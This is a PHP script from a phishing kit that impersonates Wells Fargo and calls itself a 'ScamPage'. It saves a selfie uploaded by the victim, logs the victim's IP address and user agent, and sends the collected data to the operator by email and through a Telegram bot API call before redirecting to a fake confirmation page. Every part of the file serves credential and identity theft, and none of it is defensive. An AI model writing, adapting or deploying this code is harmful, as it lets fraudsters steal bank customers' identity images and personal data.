<?php

	ob_start();
session_start();
	include '../Inc/config.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
	$actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
	$img_name=$_FILES['file2']['name'];
	$tmp_img_name=$_FILES['file2']['tmp_name'];
	$dir='../results/uploads/';
	$dir1= "/" .$dir. "" .$img_name. "" ;
	$dir1= trim(str_replace('../','',$dir1));
	$actual_link1 = trim(str_replace('/processing/selfie.php','',$actual_link));
	move_uploaded_file($tmp_img_name,$dir.$img_name);

$data = "»»————-　★[ ⚫️🌀 WELLSFARGO Selfie ⚫️🌀 ]★　————-««\r\n";
$data.= " | Selfie : $actual_link1$dir1 \r\n";
$data.= "»»————-　★[ 💻🌏 DEVICE INFO 🌏💻 ]★　————-««\r\n";
$data.= "[IP]         : $ip \r\n";
$data.= "[IP lookup]  : http://ip-api.com/json/$ip \r\n";
$data.= "[User Agent] : $useragent \r\n";
$data.= "»»————-　★[ ⚫️🌀 WELLSFARGO ScamPage B⚫️🌀 ]★　————-««\r\n";

		if ($sendtoemail=="yes"){
		$subject = "💼 WELLSFARGO Selfie 💼  From $ip";
        $headers = "From: 🍁WELLSFARGO Selfie🍁 <newfullz@sh33nz0.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($email,$subject,$data,$headers);
		}

		$txt = $data;
if ($sendtotelegram== "yes"){
    $send = ['chat_id'=>$chat_id,'text'=>$txt];
    $web_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($web_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);


        header("Location: ../thankyou-success?&web/auth/#/logon/recognizeUser/confirmation");
        exit();
	}
	 else {
		header("Location: ../index.php");
		exit();
	}
?>
